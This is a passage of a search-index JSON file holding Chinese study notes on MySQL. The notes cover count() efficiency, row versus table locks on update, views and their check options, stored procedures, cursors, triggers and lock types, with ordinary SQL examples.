\u5f15\u64ce\u904d\u5386\u6574\u5f20\u8868\uff0c\u4f46\u4e0d\u53d6\u503c\u3002\u670d\u52a1\u5c42\u5bf9\u4e8e\u8fd4\u56de\u7684\u6bcf\u4e00\u5c42\uff0c\u653e\u4e00\u4e2a\u6570\u5b57 1 \u8fdb\u53bb\uff0c\u76f4\u63a5\u6309\u884c\u8fdb\u884c\u7d2f\u52a0</li> <li>count(*)\uff1aInnoDB \u5f15\u64ce\u5e76\u4e0d\u4f1a\u628a\u5168\u90e8\u5b57\u6bb5\u53d6\u51fa\u6765\uff0c\u800c\u662f\u4e13\u95e8\u505a\u4e86\u4f18\u5316\uff0c\u4e0d\u53d6\u503c\uff0c\u670d\u52a1\u5c42\u76f4\u63a5\u6309\u884c\u8fdb\u884c\u7d2f\u52a0</li> </ul> <p>\u6309\u6548\u7387\u6392\u5e8f\uff1acount(\u5b57\u6bb5) &lt; count(\u4e3b\u952e) &lt; count(1) &lt; count(*)\uff0c\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528 count(*)</p>"},{"location":"program/2024-04-22-MYSQL/#update","title":"update\u4f18\u5316\uff08\u907f\u514d\u884c\u9501\u5347\u7ea7\u4e3a\u8868\u9501\uff09","text":"<p>InnoDB \u7684\u884c\u9501\u662f\u9488\u5bf9\u7d22\u5f15\u52a0\u7684\u9501\uff0c\u4e0d\u662f\u9488\u5bf9\u8bb0\u5f55\u52a0\u7684\u9501\uff0c\u5e76\u4e14\u8be5\u7d22\u5f15\u4e0d\u80fd\u5931\u6548\uff0c\u5426\u5219\u4f1a\u4ece\u884c\u9501\u5347\u7ea7\u4e3a\u8868\u9501\u3002</p> <p>\u5982\u4ee5\u4e0b\u4e24\u6761\u8bed\u53e5\uff1a <code>update student set no = '123' where id = 1;</code>\uff0c\u8fd9\u53e5\u7531\u4e8eid\u6709\u4e3b\u952e\u7d22\u5f15\uff0c\u6240\u4ee5\u53ea\u4f1a\u9501\u8fd9\u4e00\u884c\uff1b <code>update student set no = '123' where name = 'test';</code>\uff0c\u8fd9\u53e5\u7531\u4e8ename\u6ca1\u6709\u7d22\u5f15\uff0c\u6240\u4ee5\u4f1a\u628a\u6574\u5f20\u8868\u90fd\u9501\u4f4f\u8fdb\u884c\u6570\u636e\u66f4\u65b0\uff0c\u89e3\u51b3\u65b9\u6cd5\u662f\u7ed9name\u5b57\u6bb5\u6dfb\u52a0\u7d22\u5f15\uff0c\u5c31\u53ef\u4ee5\u7531\u8868\u9501\u53d8\u6210\u884c\u9501\u3002  </p>"},{"location":"program/2024-04-22-MYSQL/#_71","title":"\u89c6\u56fe","text":"<p>\u89c6\u56fe\uff08View\uff09\u662f\u4e00\u79cd\u865a\u62df\u5b58\u5728\u7684\u8868\u3002\u89c6\u56fe\u4e2d\u7684\u6570\u636e\u5e76\u4e0d\u5728\u6570\u636e\u5e93\u4e2d\u5b9e\u9645\u5b58\u5728\uff0c\u884c\u548c\u5217\u6570\u636e\u6765\u81ea\u5b9a\u4e49\u89c6\u56fe\u7684\u67e5\u8be2\u4e2d\u4f7f\u7528\u7684\u8868\uff0c\u5e76\u4e14\u662f\u5728\u4f7f\u7528\u89c6\u56fe\u65f6\u52a8\u6001\u751f\u6210\u7684\u3002 \u901a\u4fd7\u7684\u8bb2\uff0c\u89c6\u56fe\u53ea\u4fdd\u5b58\u4e86\u67e5\u8be2\u7684SQL\u903b\u8f91\uff0c\u4e0d\u4fdd\u5b58\u67e5\u8be2\u7ed3\u679c\u3002\u6240\u4ee5\u6211\u4eec\u5728\u521b\u5efa\u89c6\u56fe\u7684\u65f6\u5019\uff0c\u4e3b\u8981\u7684\u5de5\u4f5c\u5c31\u843d\u5728\u521b\u5efa\u8fd9\u6761SQL\u67e5\u8be2\u8bed\u53e5\u4e0a\u3002  </p>"},{"location":"program/2024-04-22-MYSQL/#_72","title":"\u521b\u5efa\u89c6\u56fe","text":"<p><code>CREATE [ OR REPLACE ] VIEW \u89c6\u56fe\u540d\u79f0[\uff08\u5217\u540d\u5217\u8868\uff09] AS SELECT \u8bed\u53e5 [ WITH [ CASCADED | LOCAL ] CHECK OPTION ]</code> </p> <p>\u4f8b\u5b50\uff1a <code>create or replace view stu_wll as select id,name from student where id&lt;=10;</code></p>"},{"location":"program/2024-04-22-MYSQL/#_73","title":"\u67e5\u8be2\u89c6\u56fe","text":"<p>\u67e5\u770b\u521b\u5efa\u89c6\u56fe\u8bed\u53e5\uff1a <code>SHOW CREATE VIEW</code>\u89c6\u56fe\u540d\u79f0\uff1b  </p> <p>\u67e5\u770b\u89c6\u56fe\u6570\u636e\uff1a<code>SELECT*FROM</code> \u89c6\u56fe\u540d\u79f0\uff1b <code>show create view stu_v_1;</code></p>"},{"location":"program/2024-04-22-MYSQL/#_74","title":"\u4fee\u6539\u89c6\u56fe","text":"<p>\u65b9\u5f0f\u4e00\uff1a<code>CREATE[OR REPLACE] VIEW \u89c6\u56fe\u540d\u79f0[\uff08\u5217\u540d\u5217\u8868)\uff09] AS SELECT \u8bed\u53e5[ WITH[ CASCADED | LOCAL ] CHECK OPTION ]</code></p> <p>\u65b9\u5f0f\u4e8c\uff1a<code>ALTER VIEW \u89c6\u56fe\u540d\u79f0 [\uff08\u5217\u540d\u5217\u8868)] AS SELECT\u8bed\u53e5 [WITH [CASCADED | LOCAL] CHECK OPTION]</code></p>"},{"location":"program/2024-04-22-MYSQL/#_75","title":"\u5220\u9664\u89c6\u56fe","text":"<p><code>DROP VIEW [IF EXISTS] \u89c6\u56fe\u540d\u79f0 [\u89c6\u56fe\u540d\u79f0]</code></p>"},{"location":"program/2024-04-22-MYSQL/#_76","title":"\u89c6\u56fe\u68c0\u67e5\u9009\u9879","text":"<p>\u5f53\u4f7f\u7528WITH CHECK QPTION\u5b50\u53e5\u521b\u5efa\u89c6\u56fe\u65f6\uff0cMySQL\u4f1a\u901a\u8fc7\u89c6\u56fe\u68c0\u67e5\u6b63\u5728\u66f4\u6539\u7684\u6bcf\u4e2a\u884c\uff0c\u4f8b\u5982\u63d2\u5165\uff0c\u66f4\u65b0\uff0c\u5220\u9664\uff0c\u4ee5\u4f7f\u5176\u7b26\u5408\u89c6\u56fe\u7684\u5b9a\u4e49\u3002MySQL\u5141\u8bb8\u57fa\u4e8e\u53e6\u4e00\u4e2a\u89c6\u56fe\u521b\u5efa\u89c6\u56fe\uff0c\u5b83\u8fd8\u4f1a\u68c0\u67e5\u4f9d\u8d56\u89c6\u56fe\u4e2d\u7684\u89c4\u5219\u4ee5\u4fdd\u6301\u4e00\u81f4\u6027\u3002\u4e3a\u4e86\u786e\u5b9a\u68c0\u67e5\u7684\u8303\u56f4\uff0cmysql\u63d0\u4f9b\u4e86\u4e24\u4e2a\u9009\u9879\uff1aCASCADED \u548c LOCAL \uff0c\u9ed8\u8ba4\u503c\u4e3a CASCADED\u3002</p> <p>NOTE\uff1a\u5982\u679c\u6ca1\u6709\u5f00\u68c0\u67e5\u9009\u9879\u5c31\u4e0d\u4f1a\u8fdb\u884c\u68c0\u67e5\u3002\u4e0d\u540c\u7248\u672c\u662f\u4e0d\u540c\u542b\u4e49\u7684\uff0c\u8981\u770b\u7248\u672c\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#cascaded","title":"CASCADED","text":"<p><code>\u7ea7\u8054\uff0c\u4e00\u65e6\u9009\u62e9\u4e86\u8fd9\u4e2a\u9009\u9879\uff0c\u9664\u4e86\u4f1a\u68c0\u67e5\u521b\u5efa\u89c6\u56fe\u65f6\u5019\u7684\u6761\u4ef6\uff0c\u8fd8\u4f1a\u68c0\u67e5\u6240\u4f9d\u8d56\u89c6\u56fe\u7684\u6761\u4ef6\u3002</code></p> <p>\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a\u521b\u5efastu_V_l \u89c6\u56fe\uff0cid\u662f\u5c0f\u4e8e\u7b49\u4e8e 20\u7684\u3002 <code>create or replace view stu_V_l as select id,name from student where id &lt;=20;</code> \u518d\u521b\u5efa stu_v_2 \u89c6\u56fe\uff0c20 &gt;= id &gt;=10\u3002 <code>create or replace view stu_v_2 as select id,name from stu_v_1 where id &gt;=10 with cascaded check option;</code> \u518d\u521b\u5efa stu_v_3 \u89c6\u56fe\u3002    <code>create or replace view stu_v_3 as select id,name from stu_v_2 where id&lt;=15;</code> \u8fd9\u6761\u6570\u636e\u80fd\u591f\u6210\u529f\uff0cstu_v_3 \u6ca1\u6709\u5f00\u68c0\u67e5\u9009\u9879\u6240\u4ee5\u4e0d\u4f1a \u53bb\u5224\u65ad id \u662f\u5426\u5c0f\u4e8e\u7b49\u4e8e15, \u76f4\u63a5\u68c0\u67e5 \u662f\u5426\u6ee1\u8db3 stu_v_2\u3002 <code>insert into stu_v_3 values(17,'Tom');</code></p>"},{"location":"program/2024-04-22-MYSQL/#local","title":"LOCAL","text":"<p>\u672c\u5730\u7684\u6761\u4ef6\u4e5f\u4f1a\u68c0\u67e5\uff0c\u8fd8\u4f1a\u5411\u4e0a\u68c0\u67e5\u3002\u5728\u5411\u4e0a\u627e\u7684\u65f6\u5019\uff0c\u5c31\u8981\u770b\u662f\u5426\u4e0a\u9762\u5f00\u4e86\u68c0\u67e5\u9009\u9879\uff0c\u5982\u679c\u6ca1\u5f00\u5c31\u4e0d\u68c0\u67e5\u3002\u548c CASCADED \u7684\u533a\u522b\u5c31\u662f CASCADED \u4e0d\u7ba1\u4e0a\u9762\u5f00\u6ca1\u5f00\u68c0\u67e5\u9009\u9879\u90fd\u4f1a\u8fdb\u884c\u68c0\u67e5\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_77","title":"\u66f4\u65b0\u53ca\u4f5c\u7528","text":"<p>\u8981\u4f7f\u89c6\u56fe\u53ef\u66f4\u65b0\uff0c\u89c6\u56fe\u4e2d\u7684\u884c\u4e0e\u57fa\u7840\u8868\u4e2d\u7684\u884c\u4e4b\u95f4\u5fc5\u987b\u5b58\u5728\u4e00\u5bf9\u4e00\u7684\u5173\u7cfb\u3002\u5982\u679c\u89c6\u56fe\u5305\u542b\u4ee5\u4e0b\u4efb\u4f55\u4e00\u9879\uff0c\u5219\u8be5\u89c6\u56fe\u4e0d\u53ef\u66f4\u65b0</p> <ol> <li>\u805a\u5408\u51fd\u6570\u6216\u7a97\u53e3\u51fd\u6570 ( SUM()\u3001MIN()\u3001MAX()\u3001COUNT() \u7b49 )</li> <li>DISTINCT</li> <li>GROUP BY</li> <li>HAVING</li> <li>UNION \u6216\u8005UNION ALL</li> </ol> <p>\u4f8b\u5b50\uff1a \u4f7f\u7528\u4e86\u805a\u5408\u51fd\u6570\uff0c\u63d2\u5165\u4f1a\u5931\u8d25\u3002 <code>create view stu_v_count as select count(*) from student;</code> <code>insert into stu_v_count values(10);</code> </p> <p>\u4f5c\u7528</p> <p>\u89c6\u56fe\u4e0d\u4ec5\u53ef\u4ee5\u7b80\u5316\u7528\u6237\u5bf9\u6570\u636e\u7684\u7406\u89e3\uff0c\u4e5f\u53ef\u4ee5\u7b80\u5316\u4ed6\u4eec\u7684\u64cd\u4f5c\u3002\u90a3\u4e9b\u88ab\u7ecf\u5e38\u4f7f\u7528\u7684\u67e5\u8be2\u53ef\u4ee5\u88ab\u5b9a\u4e49\u4e3a\u89c6\u56fe\uff0c\u4ece\u800c\u4f7f\u5f97\u7528\u6237\u4e0d\u5fc5\u4e3a\u4ee5\u540e\u7684\u64cd\u4f5c\u6bcf\u6b21\u6307\u5b9a\u5168\u90e8\u7684\u6761\u4ef6\u3002 </p> <p>\u5b89\u5168 \u6570\u636e\u5e93\u53ef\u4ee5\u6388\u6743\uff0c\u4f46\u4e0d\u80fd\u6388\u6743\u5230\u6570\u636e\u5e93\u7279\u5b9a\u884c\u548c\u7279\u5b9a\u7684\u5217\u4e0a\u3002\u901a\u8fc7\u89c6\u56fe\u7528\u6237\u53ea\u80fd\u67e5\u8be2\u548c\u4fee\u6539\u4ed6\u4eec\u6240\u80fd\u89c1\u5230\u7684\u6570\u636e \u6570\u636e\u72ec\u7acb \u89c6\u56fe\u53ef\u5e2e\u52a9\u7528\u6237\u5c4f\u853d\u771f\u5b9e\u8868\u7ed3\u6784\u53d8\u5316\u5e26\u6765\u7684\u5f71\u54cd\u3002  </p> <p>\u603b\u800c\u8a00\u4e4b \u7c7b\u4f3c\u4e8e\u7ed9\u8868\u52a0\u4e0a\u4e86\u4e00\u4e2a\u5916\u58f3\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5916\u58f3\u8bbf\u95ee\u8868\u7684\u65f6\u5019\uff0c\u53ea\u80fd\u6309\u7167\u6240\u8bbe\u8ba1\u7684\u65b9\u5f0f\u8fdb\u884c\u8bbf\u95ee\u4e0e\u66f4\u65b0\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_78","title":"\u5b58\u50a8\u8fc7\u7a0b","text":"<p>\u5b58\u50a8\u8fc7\u7a0b\u662f\u4e8b\u5148\u7ecf\u8fc7\u7f16\u8bd1\u5e76\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u7684\u4e00\u6bb5SQL \u8bed\u53e5\u7684\u96c6\u5408\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u53ef\u4ee5\u7b80\u5316\u5e94\u7528\u5f00\u53d1\u4eba\u5458\u7684\u5f88\u591a\u5de5\u4f5c\uff0c\u51cf\u5c11\u6570\u636e\u5728\u6570\u636e\u5e93\u548c\u5e94\u7528\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u4f20\u8f93\uff0c\u5bf9\u4e8e\u63d0\u9ad8\u6570\u636e\u5904\u7406\u7684\u6548\u7387\u662f\u6709\u597d\u5904\u7684\u3002 \u5b58\u50a8\u8fc7\u7a0b\u601d\u60f3\u4e0a\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u6570\u636e\u5e93SQL \u8bed\u8a00\u5c42\u9762\u7684\u4ee3\u7801\u5c01\u88c5\u4e0e\u91cd\u7528\u3002</p> <p>\u7279\u70b9 1. \u5c01\u88c5 2. \u590d\u7528 3. \u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u8fd4\u56de\u6570\u636e\u51cf\u5c11\u7f51\u7edc\u4ea4\u4e92\uff0c\u6548\u7387\u63d0\u5347</p>"},{"location":"program/2024-04-22-MYSQL/#_79","title":"\u521b\u5efa","text":"Text Only<pre><code>CREATE PROCEDURE \u5b58\u50a8\u8fc7\u7a0b\u540d\u79f0( [\u53c2\u6570\u5217\u8868] )\n\nBEGIN\n\n     SQL \u8bed\u53e5\n\nEND;\n</code></pre> <p>NOTE: \u5728\u547d\u4ee4\u884c\u4e2d\uff0c\u6267\u884c\u521b\u5efa\u5b58\u50a8\u8fc7\u7a0b\u7684SQL\u65f6\uff0c\u9700\u8981\u901a\u8fc7\u5173\u952e\u5b57delimiter \u6307\u5b9aSQL\u8bed\u53e5\u7684\u7ed3\u675f\u7b26\u3002\u9ed8\u8ba4\u662f \u5206\u53f7\u4f5c\u4e3a\u7ed3\u675f\u7b26\u3002</p> <p>delimiter $ \uff0c\u5219 $ \u7b26\u4f5c\u4e3a\u7ed3\u675f\u7b26\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_80","title":"\u8c03\u7528","text":"<p>CALL \u540d\u79f0 ( [\u53c2\u6570])</p>"},{"location":"program/2024-04-22-MYSQL/#_81","title":"\u67e5\u770b","text":"<p>\u67e5\u8be2\u6307\u5b9a\u6570\u636e\u5e93\u7684\u5b58\u50a8\u8fc7\u7a0b\u53ca\u72b6\u6001\u4fe1\u606f</p> <p><code>SELECT* FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_SCHEMA = 'xxx'</code></p> <p>\u5b58\u50a8\u8fc7\u7a0b\u540d\u79f0\uff1b--\u67e5\u8be2\u67d0\u4e2a\u5b58\u50a8\u8fc7\u7a0b\u7684\u5b9a\u4e49</p> <p><code>SHOW CREATE PROCEDURE</code></p>"},{"location":"program/2024-04-22-MYSQL/#_82","title":"\u5220\u9664","text":"<p><code>DROP PROCEDURE [ IFEXISTS ] \u5b58\u50a8\u8fc7\u7a0b\u540d\u79f0</code></p>"},{"location":"program/2024-04-22-MYSQL/#_83","title":"\u6e38\u6807","text":"<p>\u6e38\u6807\uff08CURSOR\uff09\u662f\u7528\u6765\u5b58\u50a8\u67e5\u8be2\u7ed3\u679c\u96c6\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5728\u5b58\u50a8\u8fc7\u7a0b\u548c\u51fd\u6570\u4e2d\u53ef\u4ee5\u4f7f\u7528\u6e38\u6807\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5faa\u73af\u7684\u5904\u7406\u3002\u6e38\u6807\u7684\u4f7f\u7528\u5305\u62ec\u6e38\u6807\u7684\u58f0\u660e\u3001OPEN\u3001FETCH\u548cCLOSE\uff0c\u5176\u8bed\u6cd5\u5206\u522b\u5982\u4e0b\u3002</p> <p>\u58f0\u660e\u6e38\u6807\uff1a <code>DECLARE \u6e38\u6807\u540d\u79f0 CURSOR FOR \u67e5\u8be2\u8bed\u53e5</code></p> <p>\u6253\u5f00\u6e38\u6807\uff1a <code>OPEN \u6e38\u6807\u540d\u79f0</code></p> <p>\u83b7\u53d6\u6e38\u6807\u8bb0\u5f55\uff1a <code>FETCH \u6e38\u6807\u540d\u79f0INTO\u53d8\u91cf[\u53d8\u91cf]</code></p> <p>\u6761\u4ef6\u5904\u7406\u7a0b\u5e8f\uff1a \u6761\u4ef6\u5904\u7406\u7a0b\u5e8f\uff08Handler\uff09\u53ef\u4ee5\u7528\u6765\u5b9a\u4e49\u5728\u6d41\u7a0b\u63a7\u5236\u7ed3\u6784\u6267\u884c\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\u65f6\u76f8\u5e94\u7684\u5904\u7406\u6b65\u9aa4\u3002\u5177\u4f53\u8bed\u6cd5\u4e3a\uff1a  </p> <p>DECLARE handler action HANDLER FOR condition value L condition value]..statement  </p> <p>handler_action CONTINUE\uff1a\u7ee7\u7eed\u6267\u884c\u5f53\u524d\u7a0b\u5e8f</p> <p>EXIT\uff1a\u7ec8\u6b62\u6267\u884c\u5f53\u524d\u7a0b\u5e8f</p> <p>condition_value :</p> <p><code>SQLSTATE sqlstate_value\uff1a\u72b6\u6001\u7801\uff0c\u598202000</code></p> <p><code>SQLWARNING\uff1a\u6240\u6709\u4ee501\u5f00\u5934\u7684SQLSTATE\u4ee3\u7801\u7684\u7b80\u5199</code></p> <p><code>NOT FOUND\uff1a\u6240\u6709\u4ee502\u5f00\u5934\u7684SQLSTATE\u4ee3\u7801\u7684\u7b80\u5199</code></p> <p><code>SQLEXCEPTION\uff1a\u6240\u6709\u6ca1\u6709\u88abSQLWARNING\u6216NOT FOUND\u6355\u83b7\u7684SQLSTATE\u4ee3\u7801\u7684\u7b80\u5199</code></p> <p>\u4f8b\u5b50\uff1a</p> <p>NOTE\uff1a\u8981\u5148\u58f0\u660e\u666e\u901a\u53d8\u91cf\uff0c\u518d\u7533\u8bf7\u6e38\u6807\u3002</p> <p>\u8981\u6c42\uff1a <code>\u6839\u636e\u4f20\u5165\u7684\u53c2\u6570uage\uff0c\u6765\u67e5\u8be2\u7528\u6237\u8868tb_user\u4e2d\uff0c\u6240\u6709\u7684\u7528\u6237\u5e74\u9f84\u5c0f\u4e8e\u7b49\u4e8euage\u7684\u7528\u6237\u59d3\u540d\uff08name\uff09\u548c\u4e13\u4e1a\uff08profession\uff09\uff0c\u5e76\u5c06\u7528\u6237\u7684\u59d3\u540d\u548c\u4e13\u4e1a\u63d2\u5165\u5230\u6240\u521b\u5efa\u7684\u4e00\u5f20\u65b0\u8868\uff08id\uff0cname\uff0cprofession\uff09\u4e2d\u3002</code></p> Text Only<pre><code>create procedure p1l(in uage int)\n\n    begin\n\n        declare uname varchar(100);\n\n        decLare upro varchar(100);\n\n        declare u_cursor cursor for select name,profession from tb_user where age &lt;= uage;\n\n        \u5f53 \u6761\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u5904\u7406\u7684\u72b6\u6001\u7801\u4e3a02000\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u9000\u51fa\u3002\n        declare exit handler for SQLSTATE '02000'close u_cursor;\n\n        drop table if exists tb_user_pro;\n\n        create table if not exists tb_user_pro(\n\n        id int primary key auto_increment,\n\n        name varchar(100),\n\n        profession varchar(100)\n\n        );\n\n        open u_cursor;\n\n        while true do\n\n        fetch u_cursor into uname,Upro;\n\n        insert into tb_user_pro values(null,uname,Upro);\n\n        end while;\n\n        close u_cursor;\n\n    end;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_84","title":"\u89e6\u53d1\u5668","text":"<p>\u4ecb\u7ecd \u89e6\u53d1\u5668\u662f\u4e0e\u8868\u6709\u5173\u7684\u6570\u636e\u5e93\u5bf9\u8c61\uff0c\u6307\u5728insert/update/delete\u4e4b\u524d\u6216\u4e4b\u540e\uff0c\u89e6\u53d1\u5e76\u6267\u884c\u89e6\u53d1\u5668\u4e2d\u5b9a\u4e49\u7684SQL\u8bed\u53e5\u96c6\u5408\u3002\u89e6\u53d1\u5668\u7684\u8fd9\u79cd\u7279\u6027\u53ef\u4ee5\u534f\u52a9\u5e94\u7528\u5728\u6570\u636e\u5e93\u7aef\u786e\u4fdd\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u65e5\u5fd7\u8bb0\u5f55\uff0c\u6570\u636e\u6821\u9a8c\u7b49\u64cd\u4f5c\u3002  \u4f7f\u7528\u522b\u540dOLD\u548cNEW\u6765\u5f15\u7528\u89e6\u53d1\u5668\u4e2d\u53d1\u751f\u53d8\u5316\u7684\u8bb0\u5f55\u5185\u5bb9\uff0c\u8fd9\u4e0e\u5176\u4ed6\u7684\u6570\u636e\u5e93\u662f\u76f8\u4f3c\u7684\u3002\u73b0\u5728\u89e6\u53d1\u5668\u8fd8\u53ea\u652f\u6301\u884c\u7ea7\u89e6\u53d1\uff08\u6bd4\u5982\u8bf4 \u4e00\u6761\u8bed\u53e5\u5f71\u54cd\u4e86 5 \u884c \u5219\u4f1a\u88ab\u89e6\u53d1 5 \u6b21\uff09\uff0c\u4e0d\u652f\u6301\u8bed\u53e5\u7ea7\u89e6\u53d1\uff08\u6bd4\u5982\u8bf4 \u4e00\u6761\u8bed\u53e5\u5f71\u54cd\u4e86 5 \u884c \u5219\u4f1a\u88ab\u89e6\u53d1 1 \u6b21\uff09\u3002  </p> \u89e6\u53d1\u5668\u7c7b\u578b NEW \u548c OLD INSERT NEW \u8868\u793a\u5c06\u8981\u6216\u8005\u5df2\u7ecf\u65b0\u589e\u7684\u6570\u636e UPDATE OLD\u8868\u793a\u4fee\u6539\u4e4b\u524d\u7684\u6570\u636e\uff0cNEW\u8868\u793a\u5c06\u8981\u6216\u5df2\u7ecf\u4fee\u6539\u540e\u7684\u6570\u636e DELETE OLD\u8868\u793a\u5c06\u8981\u6216\u8005\u5df2\u7ecf\u5220\u9664\u7684\u6570\u636e"},{"location":"program/2024-04-22-MYSQL/#_85","title":"\u9501","text":"<p>\u9501\u662f\u8ba1\u7b97\u673a\u534f\u8c03\u591a\u4e2a\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u5e76\u53d1\u8bbf\u95ee\u67d0\u4e00\u8d44\u6e90\u7684\u673a\u5236\u3002\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u9664\u4f20\u7edf\u7684\u8ba1\u7b97\u8d44\u6e90\uff08CPU\u3001RAM\u3001I/O\uff09\u7684\u4e89\u7528\u4ee5\u5916\uff0c\u6570\u636e\u4e5f\u662f\u4e00\u79cd\u4f9b\u8bb8\u591a\u7528\u6237\u5171\u4eab\u7684\u8d44\u6e90\u3002\u5982\u4f55\u4fdd\u8bc1\u6570\u636e\u5e76\u53d1\u8bbf\u95ee\u7684\u4e00\u81f4\u6027\u3001\u6709\u6548\u6027\u662f\u6240\u6709\u6570\u636e\u5e93\u5fc5\u987b\u89e3\u51b3\u7684\u4e00\u4e2a\u95ee\u9898\uff0c\u9501\u51b2\u7a81\u4e5f\u662f\u5f71\u54cd\u6570\u636e\u5e93\u5e76\u53d1\u8bbf\u95ee\u6027\u80fd\u7684\u4e00\u4e2a\u91cd\u8981\u56e0\u7d20\u3002\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u6765\u8bf4\uff0c\u9501\u5bf9\u6570\u636e\u5e93\u800c\u8a00\u663e\u5f97\u5c24\u5176\u91cd\u8981\uff0c\u4e5f\u66f4\u52a0\u590d\u6742\u3002</p> <p>NOTE : \u9488\u5bf9\u4e8b\u7269\u624d\u6709\u52a0\u9501\u7684\u610f\u4e49\u3002</p> <p>\u5206\u7c7b\uff1aMySQL\u4e2d\u7684\u9501\uff0c\u6309\u7167\u9501\u7684\u7c92\u5ea6\u5206\uff0c\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\uff1a</p> <ol> <li>\u5168\u5c40\u9501\uff1a\u9501\u5b9a\u6570\u636e\u5e93\u4e2d\u7684\u6240\u6709\u8868\u3002</li> <li>\u8868\u7ea7\u9501\uff1a\u6bcf\u6b21\u64cd\u4f5c\u9501\u4f4f\u6574\u5f20\u8868\u3002</li> <li>\u884c\u7ea7\u9501\uff1a\u6bcf\u6b21\u64cd\u4f5c\u9501\u4f4f\u5bf9\u5e94\u7684\u884c\u6570\u636e\u3002</li> </ol> <p>\u5168\u5c40\u9501\uff1a</p> <p>\u5168\u5c40\u9501\u5c31\u662f\u5bf9\u6574\u4e2a\u6570\u636e\u5e93\u5b9e\u4f8b\u52a0\u9501\uff0c\u52a0\u9501\u540e\u6574\u4e2a\u5b9e\u4f8b\u5c31\u5904\u4e8e\u53ea\u8bfb\u72b6\u6001\uff0c\u540e\u7eed\u7684DML\u7684\u5199\u8bed\u53e5\uff0cDDL\u8bed\u53e5\uff0c\u5df2\u7ecf\u66f4\u65b0\u64cd\u4f5c\u7684\u4e8b\u52a1\u63d0\u4ea4\u8bed\u53e5\u90fd\u5c06\u88ab\u963b\u585e\u3002 \u5176\u5178\u578b\u7684\u4f7f\u7528\u573a\u666f\u662f\u505a\u5168\u5e93\u7684\u903b\u8f91\u5907\u4efd\uff0c\u5bf9\u6240\u6709\u7684\u8868\u8fdb\u884c\u9501\u5b9a\uff0c\u4ece\u800c\u83b7\u53d6\u4e00\u81f4\u6027\u89c6\u56fe\uff0c\u4fdd\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002  </p> <p>\u8868\u9501\uff1a</p> <p>\u8868\u7ea7\u9501\uff0c\u6bcf\u6b21\u64cd\u4f5c\u9501\u4f4f\u6574\u5f20\u8868\u3002\u9501\u5b9a\u7c92\u5ea6\u5927\uff0c\u53d1\u751f\u9501\u51b2\u7a81\u7684\u6982\u7387\u6700\u9ad8\uff0c\u5e76\u53d1\u5ea6\u6700\u4f4e\u3002\u5e94\u7528\u5728MyISAM\u3001InnoDB\u3001BDB\u7b49\u5b58\u50a8\u5f15\u64ce\u4e2d\u3002  </p> <p>\u5bf9\u4e8e\u8868\u7ea7\u9501\uff0c\u4e3b\u8981\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\uff1a</p> <ol> <li> <p>\u8868\u9501\uff1a\u5bf9\u4e8e\u8868\u9501\uff0c\u5206\u4e3a\u4e24\u7c7b\uff1a1.\u8868\u5171\u4eab\u8bfb\u9501\uff08read lock\uff09\u6240\u6709\u7684\u4e8b\u7269\u90fd\u53ea\u80fd\u8bfb\uff08\u5f53\u524d\u52a0\u9501\u7684\u5ba2\u6237\u7aef\u4e5f\u53ea\u80fd\u8bfb\uff0c\u4e0d\u80fd\u5199\uff09\uff0c\u4e0d\u80fd\u5199 2.\u8868\u72ec\u5360\u5199\u9501\uff08write lock\uff09\uff0c\u5bf9\u5f53\u524d\u52a0\u9501\u7684\u5ba2\u6237\u7aef\uff0c\u53ef\u8bfb\u53ef\u5199\uff0c\u5bf9\u4e8e\u5176\u4ed6\u7684\u5ba2\u6237\u7aef\uff0c\u4e0d\u53ef\u8bfb\u4e5f\u4e0d\u53ef\u5199\u3002  \u8bfb\u9501\u4e0d\u4f1a\u963b\u585e\u5176\u4ed6\u5ba2\u6237\u7aef\u7684\u8bfb\uff0c\u4f46\u662f\u4f1a\u963b\u585e\u5199\u3002\u5199\u9501\u65e2\u4f1a\u963b\u585e\u5176\u4ed6\u5ba2\u6237\u7aef\u7684\u8bfb\uff0c\u53c8\u4f1a\u963b\u585e\u5176\u4ed6\u5ba2\u6237\u7aef\u7684\u5199\u3002</p> </li> <li> <p>\u5143\u6570\u636e\u9501\uff08meta data lock\uff0cMDL\uff09\uff0cMDL\u52a0\u9501\u8fc7\u7a0b\u662f\u7cfb\u7edf\u81ea\u52a8\u63a7\u5236\uff0c\u65e0\u9700\u663e\u5f0f\u4f7f\u7528\uff0c\u5728\u8bbf\u95ee\u4e00\u5f20\u8868\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u52a0\u4e0a\u3002MDL\u9501\u4e3b\u8981\u4f5c\u7528\u662f\u7ef4\u62a4\u8868\u5143\u6570\u636e\u7684\u6570\u636e\u4e00\u81f4\u6027\uff0c\u5728\u8868\u4e0a\u6709\u6d3b\u52a8\u4e8b\u52a1\u7684\u65f6\u5019\uff0c\u4e0d\u53ef\u4ee5\u5bf9\u5143\u6570\u636e\u8fdb\u884c\u5199\u5165\u64cd\u4f5c\u3002\u5728MySQL5.5\u4e2d\u5f15\u5165\u4e86MDL\uff0c\u5f53\u5bf9\u4e00\u5f20\u8868\u8fdb\u884c\u589e\u5220\u6539\u67e5\u7684\u65f6\u5019\uff0c\u52a0MDL\u8bfb\u9501\uff08\u5171\u4eab\